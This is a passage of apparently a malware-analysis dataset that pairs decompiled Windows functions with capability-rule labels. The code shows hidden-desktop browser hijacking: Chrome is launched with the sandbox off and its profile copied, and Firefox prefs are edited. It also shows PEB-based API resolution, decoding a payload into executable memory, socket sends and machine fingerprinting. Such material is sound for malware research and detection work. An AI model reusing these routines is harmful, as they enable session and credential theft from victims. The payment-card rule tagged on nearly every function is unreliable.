        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_10h\n// WARNING: Variable defined which should be unmapped: var_ch\n// WARNING: Variable defined which should be unmapped: var_8h\n// WARNING: Variable defined which should be unmapped: var_4h\n\nuint __cdecl fcn.0040fd0d(uint arg_8h, uint arg_ch, uint noname_2, int32_t arg_14h)\n\n{\n    int32_t in_ECX;\n    uint unaff_EBX;\n    uint unaff_EBP;\n    uint unaff_ESI;\n    uint unaff_EDI;\n    ulong uVar1;\n    int64_t iVar2;\n    uint unaff_retaddr;\n    uint in_stack_ffffffe8;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    *0x55ada0 = CONCAT44(*0x55ada4, *0x55ada0);\n    if ((*0x55ada0 == 0) && (*0x55ada0 = CONCAT44(*0x55ada4, *0x55ada0),  *0x55ada4 == 0)) {\n        uVar1 = fcn.0040f541();\n        *0x55ada0 = fcn.0040f19e(uVar1, uVar1 >> 0x20);\n        if (*0x55ada0 == 0) goto code_r0x0040fda9;\n    }\n    *0x55ada4 = *0x55ada0 >> 0x20;\n    var_10h = arg_8h;\n    var_ch = arg_ch;\n    var_4h = 0;\n    var_8h = 0x100000;\n    iVar2 = fcn.0040f91f(*0x55ada0, *0x55ada4, 5, in_ECX, in_ECX >> 0x1f, &var_10h, &var_10h >> 0x1f, &var_8h, \n                         &var_8h >> 0x1f, 0x40, 0, arg_14h, arg_14h >> 0x1f, unaff_EDI, unaff_ESI, unaff_EBX, \n                         in_stack_ffffffe8, arg_8h, arg_ch, 0x100000, 0, unaff_EBP, unaff_retaddr, arg_8h, arg_ch);\n    if (iVar2 == 0) {\n        return 1;\n    }\n    fcn.0040f238(iVar2);\ncode_r0x0040fda9:\n    *0x55ada4 = *0x55ada0 >> 0x20;\n    return 0;\n}\n",
        "token_count": 618
    },
    "0040fdb0": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows",
            "create a process with modified I/O handles and window"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nbool __cdecl fcn.0040fdb0(uint lpApplicationName, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    int32_t iVar1;\n    uint var_54h;\n    uint var_28h;\n    uint var_24h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    \n    fcn.00401052(&var_54h, 0, 0x44);\n    var_18h = arg_ch;\n    var_1ch = arg_10h;\n    var_14h = arg_14h;\n    var_24h._0_2_ = 0;\n    var_54h = 0x44;\n    var_28h = 0x101;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateProcessW)(lpApplicationName, 0, 0, 0, 1, 0x10, 0, 0, &var_54h, &var_10h);\n    if (iVar1 != 0) {\n        *0x42660c = var_10h;\n    }\n    fcn.00405feb();\n    return iVar1 != 0;\n}\n",
        "token_count": 285
    },
    "004106f9": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "send data on socket",
            "send data"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004106f9(int32_t arg_8h, uint arg_ch)\n\n{\n    uint uVar1;\n    int32_t arg_8h_00;\n    uint in_EDX;\n    \n    uVar1 = *0x559cac;\n    arg_8h_00 = fcn.00401085(0x2000);\n    fcn.0040102c(arg_8h_00, &arg_ch, 4);\n    fcn.0040102c(arg_8h_00 + 4, &arg_8h, 4);\n    fcn.0040102c(arg_8h_00 + 8, in_EDX, arg_8h);\n    (*_sym.imp.WS2_32.dll_send)(uVar1, arg_8h_00, arg_8h + 8, 0);\n    fcn.00401099(arg_8h_00);\n    return;\n}\n",
        "token_count": 208
    },
    "00410a8c": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.00410a8c(uint param_1)\n\n{\n    int32_t iVar1;\n    uint Name;\n    uint ReferencedDomainName;\n    uint peUse;\n    uint cchName;\n    uint cchReferencedDomainName;\n    uint pIdentifierAuthority;\n    uint var_8h;\n    int32_t pSid;\n    \n    cchReferencedDomainName = 0x10;\n    pSid = 0;\n    pIdentifierAuthority = 0;\n    var_8h._0_2_ = 0x500;\n    fcn.00401052(&Name, 0, 0x208);\n    cchName = 0x104;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_AllocateAndInitializeSid)\n                      (&pIdentifierAuthority, 2, 0x20, 0x220, 0, 0, 0, 0, 0, 0, &pSid);\n    if (iVar1 != 0) {\n        iVar1 = (*_sym.imp.ADVAPI32.dll_LookupAccountSidW)\n                          (0, pSid, &Name, &cchName, &ReferencedDomainName, &cchReferencedDomainName, &peUse);\n        if (iVar1 != 0) goto code_r0x00410b16;\n    }\n    (*_sym.imp.KERNEL32.dll_GetLastError)();\ncode_r0x00410b16:\n    if (pSid != 0) {\n        (*_sym.imp.ADVAPI32.dll_FreeSid)(pSid);\n    }\n    fcn.004036f7(&Name);\n    return param_1;\n}\n",
        "token_count": 370
    },
    "00410c8a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "get common file path"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00410c8a(uint param_1, uint param_2)\n\n{\n    uint var_208h;\n    \n    fcn.00401052(&var_208h, 0, 0x208);\n    (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathW)(0, &var_208h, param_2, 0);\n    fcn.004036f7(&var_208h);\n    return param_1;\n}\n",
        "token_count": 103
    },
    "00410e5e": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\n// WARNING: Removing unreachable block (ram,0x00410e7b)\n\nuint __fastcall fcn.00410e5e(uint param_1)\n\n{\n    uint32_t *puVar1;\n    uint uVar2;\n    uint *arg_8h;\n    uint arg_8h_00;\n    uint32_t uVar3;\n    uint arg_8h_01;\n    uint uVar4;\n    uint var_58h;\n    uint var_48h;\n    uint var_38h;\n    uint32_t var_18h;\n    uint32_t uStack24;\n    uint32_t uStack20;\n    uint32_t uStack16;\n    uint var_8h;\n    uint32_t var_4h;\n    \n    uVar3 = 0x80000000;\n    puVar1 = cpuid(0x80000000);\n    var_18h = *puVar1;\n    uStack24 = puVar1[1];\n    uStack16 = puVar1[2];\n    uStack20 = puVar1[3];\n    var_8h = param_1;\n    var_4h = var_18h;\n    if (0x7fffffff < var_18h) {\n        do {\n            if (uVar3 == 0) {\n                puVar1 = cpuid_basic_info(0);\n            }\n            else if (uVar3 == 1) {\n                puVar1 = cpuid_Version_info(1);\n            }\n            else if (uVar3 == 2) {\n                puVar1 = cpuid_cache_tlb_info(2);\n            }\n            else if (uVar3 == 3) {\n                puVar1 = cpuid_serial_info(3);\n            }\n            else if (uVar3 == 4) {\n                puVar1 = cpuid_Deterministic_Cache_Parameters_info(4);\n            }\n            else if (uVar3 == 5) {\n                puVar1 = cpuid_MONITOR_MWAIT_Features_info(5);\n            }\n            else if (uVar3 == 6) {\n                puVar1 = cpuid_Thermal_Power_Management_info(6);\n            }\n            else if (uVar3 == 7) {\n                puVar1 = cpuid_Extended_Feature_Enumeration_info(7);\n            }\n            else if (uVar3 == 9) {\n                puVar1 = cpuid_Direct_Cache_Access_info(9);\n            }\n            else if (uVar3 == 10) {\n                puVar1 = cpuid_Architectural_Performance_Monitoring_info(10);\n            }\n            else if (uVar3 == 0xb) {\n                puVar1 = cpuid_Extended_Topology_info(0xb);\n            }\n            else if (uVar3 == 0xd) {\n                puVar1 = cpuid_Processor_Extended_States_info(0xd);\n            }\n            else if (uVar3 == 0xf) {\n                puVar1 = cpuid_Quality_of_Service_info(0xf);\n            }\n            else if (uVar3 == 0x80000002) {\n                puVar1 = cpuid_brand_part1_info(0x80000002);\n            }\n            else if (uVar3 == 0x80000003) {\n                puVar1 = cpuid_brand_part2_info(0x80000003);\n            }\n            else if (uVar3 == 0x80000004) {\n                puVar1 = cpuid_brand_part3_info(0x80000004);\n            }\n            else {\n                puVar1 = cpuid(uVar3);\n            }\n            var_18h = *puVar1;\n            uStack24 = puVar1[1];\n            uStack16 = puVar1[2];\n            uStack20 = puVar1[3];\n            if (uVar3 == 0x80000002) {\n                arg_8h = &var_58h;\ncode_r0x00410eea:\n                fcn.0040102c(arg_8h, &var_18h, 0x10);\n            }\n            else {\n                if (uVar3 == 0x80000003) {\n                    arg_8h = &var_48h;\n                    goto code_r0x00410eea;\n                }\n                if (uVar3 == 0x80000004) {\n                    arg_8h = &var_38h;\n                    goto code_r0x00410eea;\n                }\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 <= var_4h);\n    }\n    arg_8h_00 = fcn.00401085(0x200);\n    fcn.0040102c(arg_8h_00, &var_58h, 0x40);\n    uVar2 = var_8h;\n    arg_8h_01 = arg_8h_00;\n    uVar4 = var_8h;\n    fcn.004034d1(arg_8h_00);\n    fcn.004031af(arg_8h_01);\n    fcn.00405feb(arg_8h_01, uVar4);\n    fcn.00401099(arg_8h_00);\n    return uVar2;\n}\n",
        "token_count": 1146
    },
    "004111d7": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create or open registry key"
        ],
        "decompiled_code": "\nuint * __fastcall fcn.004111d7(uint *param_1)\n\n{\n    uint *puVar1;\n    int32_t iVar2;\n    uint uVar3;\n    char16_t *arg_ch;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint phkResult;\n    \n    phkResult = 0;\n    *param_1 = 0;\n    param_1[1] = 0;\n    if (*0x55ad8c == 0) {\n        puVar1 = fcn.004036f7(0x419ba0);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExW)(0x80000002, *puVar1, 0, 0x101, &phkResult);\n        fcn.00405feb();\n        if (iVar2 == 0) {\n            arg_ch = L\"MachineGuid\";\n            uVar3 = fcn.004036f7(L\"MachineGuid\");\n            fcn.00412569(uVar3, arg_ch);\n            fcn.00405feb();\n            fcn.00412554();\n        }\n        uVar3 = fcn.004061c0();\n        fcn.00402fce(uVar3);\n        fcn.00403148();\n        puVar1 = param_1;\n    }\n    else {\n        puVar1 = 0x55ad88;\n    }\n    fcn.00402fce(puVar1);\n    fcn.00403148();\n    fcn.00412554();\n    return param_1;\n}\n",
        "token_count": 355
    },
    "0041154a": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "check for time delay via GetTickCount/79c6cbe28590449abc100fa77278b382"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041154a(uint param_1)\n\n{\n    int16_t iVar1;\n    int16_t *lpString2;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    uint *arg_8h;\n    int16_t *arg_ch;\n    int32_t var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint lpRootPathName;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    var_8h = param_1;\n    lpString2 = fcn.00406099();\n    var_1ch = 0;\n    var_18h = 5;\n    var_20h = 5;\n    fcn.00401a48();\n    arg_ch = lpString2;\n    uVar2 = (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsW)(0x104);\n    if (0x104 < uVar2) {\n        lpString2 = fcn.00406099();\n        (*_sym.imp.KERNEL32.dll_GetLogicalDriveStringsW)(uVar2, lpString2);\n    }\n    iVar1 = *lpString2;\n    while (iVar1 != 0) {\n        lpRootPathName = 0;\n        uVar3 = fcn.004036f7(lpString2);\n        fcn.00403549(uVar3);\n        fcn.00405feb();\n        var_4h = 0;\n        uVar3 = (*_sym.imp.KERNEL32.dll_GetDriveTypeW)(lpRootPathName);\n        arg_8h = &lpRootPathName;\n        var_10h = uVar3;\n        fcn.0040373f(arg_8h);\n        fcn.00401955(arg_8h, arg_ch, uVar3);\n        iVar4 = fcn.00403373();\n        lpString2 = lpString2 + iVar4 + 1;\n        fcn.00405feb();\n        lpRootPathName = 0;\n        param_1 = var_8h;\n        iVar1 = *lpString2;\n    }\n    fcn.004013fa(&var_24h);\n    if (var_24h != 0) {\n        fcn.00401b52(var_24h);\n    }\n    return param_1;\n}\n",
        "token_count": 532
    },
    "00411b3f": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "PEB access",
            "access PEB ldr_data",
            "contain loop"
        ],
        "decompiled_code": "\nuint fcn.00411b3f(void)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint *puVar3;\n    int32_t in_FS_OFFSET;\n    \n    puVar3 = *(*(in_FS_OFFSET + 0x30) + 0xc) + 0x14;\n    puVar2 = *puVar3;\n    while( true ) {\n        if (puVar2 == puVar3) {\n            return 0;\n        }\n        iVar1 = fcn.00411bfd();\n        if (iVar1 == 0) break;\n        puVar2 = *puVar2;\n    }\n    return puVar2[4];\n}\n",
        "token_count": 148
    },
    "00411be3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nint32_t * __fastcall fcn.00411be3(int16_t *param_1)\n\n{\n    int32_t *piVar1;\n    \n    if ((*param_1 != 0x5a4d) || (piVar1 = *(param_1 + 0x1e) + param_1,  *piVar1 != 0x4550)) {\n        piVar1 = NULL;\n    }\n    return piVar1;\n}\n",
        "token_count": 99
    },
    "00411bfd": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00411bfd(int16_t *param_1)\n\n{\n    uint16_t uVar1;\n    uint16_t uVar2;\n    uint16_t *puVar3;\n    \n    puVar3 = 0x419ab0;\n    if (*param_1 != 0) {\n        do {\n            uVar1 = *puVar3;\n            if (uVar1 == 0) {\n                return 1;\n            }\n            uVar2 = *(param_1 + -0x20cd58 + puVar3);\n            if (uVar1 >= uVar2 && uVar1 != uVar2) {\n                return 0xffffffff;\n            }\n            if (uVar1 < uVar2) {\n                return 1;\n            }\n            puVar3 = puVar3 + 1;\n        } while (*(param_1 + -0x20cd58 + puVar3) != 0);\n        if (*puVar3 == 0) {\n            return 0;\n        }\n    }\n    return 0xffffffff;\n}\n",
        "token_count": 229
    },
    "00411ce3": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00411ce3(int32_t param_1)\n\n{\n    code *pcVar1;\n    int32_t *piVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    int32_t *piVar6;\n    uint32_t *puVar7;\n    uint *puVar8;\n    uint var_2ch;\n    uint var_24h;\n    code *var_1ch;\n    code *var_18h;\n    code *var_14h;\n    int32_t var_10h;\n    int32_t var_ch;\n    code *var_8h;\n    int32_t var_4h;\n    \n    var_10h = param_1;\n    fcn.00411b3f(param_1);\n    pcVar1 = fcn.00411e88();\n    var_1ch = pcVar1;\n    fcn.00411b3f();\n    var_14h = fcn.00411e88();\n    fcn.00411b3f();\n    var_8h = fcn.00411e88();\n    fcn.00411b3f();\n    var_18h = fcn.00411e88();\n    piVar2 = fcn.00411b6d(1, 0);\n    if (piVar2 != NULL) {\n        for (; piVar2[3] != 0; piVar2 = piVar2 + 5) {\n            var_4h = 0;\n            (*var_14h)(&var_24h, piVar2[3] + param_1);\n            iVar3 = (*pcVar1)(0, 0, &var_24h, &var_4h);\n            if ((iVar3 < 0) || (var_4h == 0)) {\n                return 0;\n            }\n            iVar3 = *piVar2;\n            if (iVar3 == 0) {\n                iVar3 = piVar2[4];\n                iVar5 = iVar3;\n            }\n            else {\n                iVar5 = piVar2[4];\n            }\n            piVar6 = iVar5 + param_1;\n            puVar7 = param_1 + iVar3;\n            uVar4 = *puVar7;\n            pcVar1 = var_1ch;\n            param_1 = var_10h;\n            while (var_1ch = pcVar1,  var_10h = param_1,  uVar4 != 0) {\n                if (uVar4 < 0) {\n                    uVar4 = uVar4 & 0xffff;\n                    puVar8 = NULL;\n                }\n                else {\n                    (*var_18h)(&var_2ch, uVar4 + param_1 + 2);\n                    uVar4 = 0;\n                    puVar8 = &var_2ch;\n                }\n                iVar3 = (*var_8h)(var_4h, puVar8, uVar4, &var_ch);\n                if (iVar3 < 0) {\n                    return 0;\n                }\n                if (var_ch == 0) {\n                    return 0;\n                }\n                puVar7 = puVar7 + 1;\n                *piVar6 = var_ch;\n                piVar6 = piVar6 + 1;\n                pcVar1 = var_1ch;\n                param_1 = var_10h;\n                uVar4 = *puVar7;\n            }\n        }\n    }\n    return 1;\n}\n",
        "token_count": 767
    },
    "00411e88": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.00411e88(int32_t param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    int32_t var_8h;\n    uint lpString2;\n    \n    uVar3 = 0;\n    var_8h = param_1;\n    lpString2 = param_2;\n    iVar1 = fcn.00411b6d(0, &var_8h);\n    if ((iVar1 != 0) && (var_8h = *(iVar1 + 0x20) + param_1,  *(iVar1 + 0x18) != 0)) {\n        do {\n            iVar2 = (*_sym.imp.KERNEL32.dll_lstrcmpA)(*(var_8h + uVar3 * 4) + param_1, lpString2);\n            if (iVar2 == 0) {\n                return *(*(iVar1 + 0x1c) + param_1 + *(*(iVar1 + 0x24) + uVar3 * 2 + param_1) * 4) + param_1;\n            }\n            uVar3 = uVar3 + 1;\n        } while (uVar3 < *(iVar1 + 0x18));\n    }\n    return 0;\n}\n",
        "token_count": 296
    },
    "00411fe2": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00411fe2(int32_t arg_8h, uint arg_ch)\n\n{\n    int32_t in_ECX;\n    \n    *(in_ECX + 0x28) = 0;\n    *(in_ECX + 0x2c) = 0;\n    fcn.00406056(0x28);\n    fcn.004030cc(arg_8h + *(in_ECX + 0xc), *(in_ECX + 0x10));\n    return;\n}\n",
        "token_count": 111
    },
    "00412018": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00412018(uint *arg_8h)\n\n{\n    uint *in_ECX;\n    int32_t iVar1;\n    uint *puVar2;\n    \n    in_ECX[10] = 0;\n    in_ECX[0xb] = 0;\n    puVar2 = arg_8h;\n    for (iVar1 = 10; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *in_ECX = *puVar2;\n        puVar2 = puVar2 + 1;\n        in_ECX = in_ECX + 1;\n    }\n    fcn.00402fce(arg_8h + 10);\n    return;\n}\n",
        "token_count": 154
    },
    "004120f8": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create process on Windows"
        ],
        "decompiled_code": "\nbool __cdecl fcn.004120f8(uint *lpApplicationName, uint *lpCommandLine)\n\n{\n    int32_t iVar1;\n    uint *in_ECX;\n    uint var_54h;\n    uint var_10h;\n    \n    fcn.00401052(&var_54h, 0, 0x44);\n    var_54h = 0x44;\n    iVar1 = (*_sym.imp.KERNEL32.dll_CreateProcessW)\n                      (*lpApplicationName, *lpCommandLine, 0, 0, 0, 0, 0, 0, &var_54h, &var_10h);\n    if (iVar1 != 0) {\n        *in_ECX = var_10h;\n    }\n    return iVar1 != 0;\n}\n",
        "token_count": 172
    },
    "00413323": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\ncode * fcn.00413323(void)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    code *arg_ch;\n    bool bVar3;\n    uint var_4h;\n    \n    arg_ch = fcn.00413323;\n    var_4h = 0x905a4d;\n    iVar2 = 0;\n    while (iVar1 = fcn.00401000(&var_4h, arg_ch, 4),  iVar1 != 0) {\n        iVar1 = iVar2 + 1;\n        arg_ch = arg_ch + -1;\n        bVar3 = iVar2 != 999;\n        iVar2 = 0;\n        if (bVar3) {\n            iVar2 = iVar1;\n        }\n    }\n    return arg_ch;\n}\n",
        "token_count": 173
    },
    "00413441": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00413441(int32_t arg_8h)\n\n{\n    uint lpString2;\n    uint arg_8h_00;\n    uint *in_ECX;\n    uint var_4h;\n    \n    *in_ECX = 0;\n    if (arg_8h != 0) {\n        lpString2 = fcn.00401085(arg_8h + 2);\n        fcn.00406077(arg_8h + 2);\n        fcn.00406056(arg_8h);\n        arg_8h_00 = fcn.004036f7(lpString2);\n        fcn.00403549(arg_8h_00);\n        fcn.00405feb();\n        fcn.00401099(lpString2);\n    }\n    return;\n}\n",
        "token_count": 174
    },
    "0041350d": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "allocate memory",
            "allocate RW memory",
            "contain loop"
        ],
        "decompiled_code": "\nint32_t __fastcall fcn.0041350d(int32_t param_1, uint32_t param_2)\n\n{\n    int32_t iVar1;\n    uint8_t *puVar2;\n    uint32_t uVar3;\n    int32_t lpflOldProtect;\n    uint32_t var_4h;\n    \n    uVar3 = 0;\n    lpflOldProtect = param_1;\n    var_4h = param_2;\n    iVar1 = (*_sym.imp.KERNEL32.dll_VirtualAlloc)(0, param_2, 0x1000, 4);\n    puVar2 = (var_4h - 1) + param_1;\n    do {\n        *(uVar3 + iVar1) = ~*puVar2;\n        uVar3 = uVar3 + 1;\n        puVar2 = puVar2 + -1;\n    } while (uVar3 <= var_4h);\n    (*_sym.imp.KERNEL32.dll_VirtualProtect)(iVar1, var_4h, 0x40, &lpflOldProtect);\n    return iVar1;\n}\n",
        "token_count": 243
    },
    "00413594": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00413594(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    code *pcVar3;\n    int32_t in_ECX;\n    uint extraout_ECX;\n    \n    pcVar3 = *(in_ECX + 0xc);\n    if (pcVar3 == NULL) {\n        fcn.004135e5();\n        iVar1 = fcn.00411ef1();\n        *(in_ECX + 0x18) = iVar1;\n        if (iVar1 != 0) {\n            uVar2 = fcn.00411e88(extraout_ECX);\n            *(in_ECX + 0xc) = uVar2;\n        }\n        pcVar3 = *(in_ECX + 0xc);\n        if (pcVar3 == NULL) {\n            return 1;\n        }\n    }\n    (*pcVar3)(arg_8h, arg_ch, arg_10h);\n    return 1;\n}\n",
        "token_count": 225
    },
    "00413605": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00413605(uint arg_8h)\n\n{\n    fcn.00402fce(&arg_8h);\n    fcn.00403148();\n    return;\n}\n",
        "token_count": 42
    },
    "00413695": {
        "rules": [
            "validate payment card number using luhn algorithm with no lookup table/ca2c8d7b7d994625afebb42274522c55",
            "create directory",
            "write file on Windows",
            "read .ini file",
            "write and execute a file"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.00413695(uint *lpApplicationName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint *puVar4;\n    uint *puVar5;\n    char *pcVar6;\n    uint pszPath;\n    uint var_304h;\n    uint var_fch;\n    uint lpProcessAttributes;\n    uint var_ach;\n    uint hHandle;\n    uint var_5ch;\n    uint uStack92;\n    uint var_54h;\n    uint uStack84;\n    uint var_4ch;\n    uint lpFileOp;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_32h;\n    uint var_2eh;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint *var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint lpCommandLine;\n    uint var_ch;\n    uint lpFileName;\n    \n    fcn.00401052(&lpProcessAttributes, 0, 0x44);\n    lpProcessAttributes = 0x44;\n    var_5ch = 0;\n    uStack92 = 0;\n    var_54h = 0;\n    uStack84 = 0;\n    var_ach = 0x41a420;\n    (*_sym.imp.USER32.dll_CreateDesktopW)(0x41a420, 0, 0, 0, 0x10000000, 0);\n    fcn.00401052(&pszPath, 0, 0x208);\n    iVar2 = fcn.00403373();\n    if (iVar2 == 0) {\n        var_ch = 0x104;\n        (*_sym.imp.SHLWAPI.dll_AssocQueryStringW)(0, 2, L\"http\", 0x4176a8, &pszPath, &var_ch);\n        uVar3 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(&pszPath);\n        uVar3 = (*_sym.imp.USER32.dll_CharLowerW)(uVar3);\n        puVar4 = &pszPath;\n    }\n    else {\n        uVar3 = (*_sym.imp.SHLWAPI.dll_PathFindFileNameW)(lpApplicationName);\n        uVar3 = (*_sym.imp.USER32.dll_CharLowerW)(uVar3);\n        puVar4 = lpApplicationName;\n    }\n    var_1ch = puVar4;\n    iVar2 = fcn.00401144(uVar3, L\"chrome.exe\");\n    if (iVar2 == 0) {\n        fcn.004036f7(L\"chrome.exe\");\n        iVar2 = fcn.00412155();\n        fcn.00405feb();\n        if (iVar2 == 0) {\n            fcn.004036f7(0x417b80);\n            pcVar6 = \" --no-sandbox --allow-no-sandbox-job --disable-3d-apis --disable-gpu --disable-d3d11\";\n            uVar3 = 0x41a0ec;\n            puVar5 = puVar4;\n            fcn.0040357c(puVar4);\n            fcn.004033d1(puVar5);\n            fcn.004033d1(puVar5);\n            (*_sym.imp.KERNEL32.dll_CreateProcessW)\n                      (puVar4, lpCommandLine, 0, 0, 0, 0, 0, 0, &lpProcessAttributes, &var_5ch, puVar5, uVar3, pcVar6);\n        }\n        else {\n            fcn.00410c8a();\n            fcn.0040373f(&lpCommandLine);\n            uVar3 = fcn.004036f7(L\"\\\\AppData\\\\Local\\\\Google\\\\Chrome\\\\User Data\");\n            fcn.00403447(uVar3);\n            fcn.00405feb();\n            fcn.0040373f(&lpCommandLine);\n            uVar3 = fcn.004036f7(L\"\\\\AppData\\\\Local\\\\GoogleBackup\");\n            fcn.00403447(uVar3);\n            fcn.00405feb();\n            var_38h._0_2_ = 0x414;\n            lpFileOp = 0;\n            var_44h = 3;\n            var_40h = lpFileName;\n            var_3ch = 0;\n            stack0xffffffc6 = 0;\n            var_2eh = 0;\n            var_32h = 0;\n            (*_sym.imp.SHELL32.dll_SHFileOperationW)(&lpFileOp);\n            (*_sym.imp.KERNEL32.dll_CreateDirectoryW)(lpFileName, 0);\n            fcn.004036f7(L\"xcopy.exe /H /Y /E /C \");\n            fcn.004033d1(0x41a0ec);\n            fcn.00403447(&var_24h);\n            uVar3 = 0x41a0ec;\n            fcn.004033d1(0x41a0ec);\n            fcn.004033d1(uVar3);\n            fcn.004033d1(uVar3);\n            fcn.00403447(&lpFileName);\n            fcn.004033d1(0x41a0ec);\n            fcn.00410c8a();\n            uVar3 = fcn.004036f7(L\"\\\\xcopy.exe\");\n            fcn.00403447(uVar3);\n            fcn.00405feb();\n            fcn.00401052(&var_fch, 0, 0x44);\n            pcVar1 = _sym.imp.KERNEL32.dll_CreateProcessW;\n            (*_sym.imp.KERNEL32.dll_CreateProcessW)(var_20h, var_18h, 0, 0, 0, 0x8000000, 0, 0, &var_fch, &hHandle);\n            (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(hHandle, 0xffffffff);\n            fcn.004036f7(0x417b80);\n            puVar4 = var_1ch;\n            fcn.0040357c(var_1ch);\n            fcn.004033d1(puVar4);\n            fcn.004033d1(puVar4);\n            fcn.00403447(&lpFileName);\n            fcn.004033d1(0x41a0ec);\n            (*pcVar1)(var_1ch, var_14h, 0, 0, 0, 0, 0, 0, &lpProcessAttributes, &var_5ch);\n            fcn.00405feb();\n            var_14h = 0;\n            fcn.00405feb();\n            fcn.00405feb();\n            var_18h = 0;\n            fcn.00405feb();\n            fcn.00405feb();\n        }\n        fcn.00405feb();\n        uVar3 = 0xfffffffe;\n    }\n    else {\n        iVar2 = fcn.00401144(uVar3, L\"firefox.exe\");\n        if (iVar2 == 0) {\n            fcn.004036f7(L\"firefox.exe\");\n            iVar2 = fcn.00412155();\n            fcn.00405feb();\n            if (iVar2 == 0) {\n                fcn.00401052(&var_304h, 0, 0x208);\n                fcn.00410c8a();\n                fcn.0040373f(&lpCommandLine);\n                uVar3 = fcn.004036f7(L\"\\\\AppData\\\\Roaming\\\\Mozilla\\\\Firefox\\\\\");\n                fcn.00403447(uVar3);\n                fcn.00405feb();\n                fcn.0040373f(&lpFileName);\n                fcn.0040357c(L\"profiles.ini\");\n                (*_sym.imp.KERNEL32.dll_GetPrivateProfileStringW)(L\"Profile0\", L\"Path\", 0, &var_304h, 0x104, var_ch);\n                fcn.0040357c(&var_304h);\n                uVar3 = fcn.004036f7(L\"\\\\prefs.js\");\n                fcn.00403447(uVar3);\n                fcn.00405feb();\n                uVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(lpFileName, 4, 3, 0, 4, 0x80, 0);\n                (*_sym.imp.KERNEL32.dll_WriteFile)\n                          (uVar3, \"user_pref(\\\"layers.acceleration.disabled\\\", true);\", 0x30, &var_4ch, 0);\n                